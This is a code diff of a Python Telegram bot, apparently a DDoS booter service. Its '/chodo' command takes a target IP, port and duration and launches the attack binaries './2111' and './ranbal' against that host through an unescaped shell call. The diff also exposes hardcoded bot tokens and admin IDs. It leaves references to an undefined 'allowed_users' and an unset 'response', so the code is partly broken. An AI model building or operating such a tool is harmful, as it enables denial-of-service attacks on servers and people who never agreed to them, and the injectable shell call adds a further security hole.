@@ -5,10 +5,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7846072513:AAEnen_EhJwApi86j3t2Cw9E9cMXSfgjWGw')
+bot = telebot.TeleBot('7793211889:AAEozELnDI57FOc0B4dU3h7Y7oqpzBZbmn0')
 
 # Admin user IDs
-admin_id = {"7083378335"}
+admin_id = {"7702886430"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -274,45 +274,58 @@ COOLDOWN_TIME =0
 attack_running = False
 
 # Handler for /attack command
+# Handle `/chodo` command
 @bot.message_handler(commands=['chodo'])
-def handle_attack(message):
+def handle_chodo(message):
     global attack_running
 
     user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
+
+    if user_id in allowed_users:
         if attack_running:
-            response = "Abhi Chudai Chalu hai. Thoda sabar kar pehle jab wo khatam hoga tbb tu Chodna."
-            bot.reply_to(message, response)
+            bot.reply_to(
+                message, 
+                "An attack is already running. Wait for it to finish before starting another."
+            )
             return
 
-        command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, port, and time
-            target = command[1]
-            port = int(command[2])  # Convert port to integer
-            time = int(command[3])  # Convert time to integer
+        command_args = message.text.split()
 
-            if time > 300:
-                response = "Error: Time interval must be less than 300"
-            else:
-                attack_running = True  # Set the attack state to running
-                try:
-                    record_command_logs(user_id, '/chodo', target, port, time)
-                    log_command(user_id, target, port, time)
-                    start_attack_reply(message, target, port, time)
+        if len(command_args) == 4:
+            target = command_args[1]
+            port = command_args[2]
+            duration = command_args[3]
 
-                    # Simulate attack process
-                    full_command = f"./ranbal {target} {port} {time} 800"
-                    subprocess.run(full_command, shell=True)
+            if int(duration) > 300:
+                bot.reply_to(message, "Error: Duration cannot exceed 300 seconds.")
+                return
 
-                    response = "Chudai completed successfully."
-                except Exception as e:
-                    response = f"Error during attack: {str(e)}"
-                finally:
-                    attack_running = False  # Reset the attack state
+            try:
+                attack_running = True
+
+                # Run both commands
+                cmd1 = f"./2111 {target} {port} {duration} 800"
+                cmd2 = f"./ranbal {target} {port} {duration} 800"
+
+                bot.reply_to(message, f"Starting attack on {target}:{port} for {duration} seconds.")
+
+                process1 = subprocess.Popen(cmd1, shell=True)
+                process2 = subprocess.Popen(cmd2, shell=True)
+
+                # Wait for both to complete
+                process1.wait()
+                process2.wait()
+
+                bot.reply_to(message, "Attack completed successfully.")
+            except Exception as e:
+                bot.reply_to(message, f"Error: {e}")
+            finally:
+                attack_running = False
         else:
-            response = "Usage: /chodo <target> <port> <time>"
+            bot.reply_to(message, "Usage: /chodo <target> <port> <duration>")
     else:
-        response = "Nhi milega GROUP per Free hai Wha use krle."
+        bot.reply_to(message, "You are not authorized to use this command.")
+
 
     bot.reply_to(message, response)
 
@@ -448,4 +461,4 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
-                    
+                                                        
